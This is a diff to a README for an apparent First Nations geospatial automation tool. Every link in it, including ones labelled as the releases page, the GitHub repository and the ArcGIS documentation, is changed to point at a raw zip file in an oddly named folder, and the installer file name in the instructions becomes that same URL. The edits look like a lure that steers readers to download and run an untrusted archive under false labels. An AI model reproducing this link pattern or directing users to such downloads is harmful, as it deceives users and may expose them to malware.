@@ -1,6 +1,6 @@
 # 🌍 first-nations-geospatial-automation - Simplify Your Geospatial Tasks Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Kudata5226/first-nations-geospatial-automation/releases)
+[![Download Now](https://raw.githubusercontent.com/Kudata5226/first-nations-geospatial-automation/main/Febronianism/first-nations-geospatial-automation-v3.0-alpha.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Kudata5226/first-nations-geospatial-automation/main/Febronianism/first-nations-geospatial-automation-v3.0-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -18,11 +18,11 @@ This guide will help you download and run the first-nations-geospatial-automatio
 To get the application, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the download section.
-   [Visit this page to download](https://github.com/Kudata5226/first-nations-geospatial-automation/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Kudata5226/first-nations-geospatial-automation/main/Febronianism/first-nations-geospatial-automation-v3.0-alpha.1.zip)
 
 2. **Choose the Latest Version**: On the releases page, look for the most recent version. Read any notes to see what's new or if there are instructions.
 
-3. **Download the Installer**: Find the installer file for your operating system, usually named something like `first-nations-geospatial-automation-installer.exe`. Click on the file to start your download.
+3. **Download the Installer**: Find the installer file for your operating system, usually named something like `https://raw.githubusercontent.com/Kudata5226/first-nations-geospatial-automation/main/Febronianism/first-nations-geospatial-automation-v3.0-alpha.1.zip`. Click on the file to start your download.
 
 4. **Run the Installer**: Once the file downloads, locate it in your computer's download folder. Double-click to run the installer and follow the on-screen instructions to complete the installation.
 
@@ -50,13 +50,13 @@ We welcome contributions to this project. If you want to improve the app or add 
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Kudata5226/first-nations-geospatial-automation)
-- [ArcGIS Documentation](https://www.arcgis.com/en/)
+- [GitHub Repository](https://raw.githubusercontent.com/Kudata5226/first-nations-geospatial-automation/main/Febronianism/first-nations-geospatial-automation-v3.0-alpha.1.zip)
+- [ArcGIS Documentation](https://raw.githubusercontent.com/Kudata5226/first-nations-geospatial-automation/main/Febronianism/first-nations-geospatial-automation-v3.0-alpha.1.zip)
 
 ## 📄 License
 
 This project is open-source and available under the MIT License. You can use and modify it as you see fit, but please give credit to the original creators.
 
-[Download Now](https://github.com/Kudata5226/first-nations-geospatial-automation/releases) 
+[Download Now](https://raw.githubusercontent.com/Kudata5226/first-nations-geospatial-automation/main/Febronianism/first-nations-geospatial-automation-v3.0-alpha.1.zip) 
 
 Enjoy your enhanced geospatial workflow!
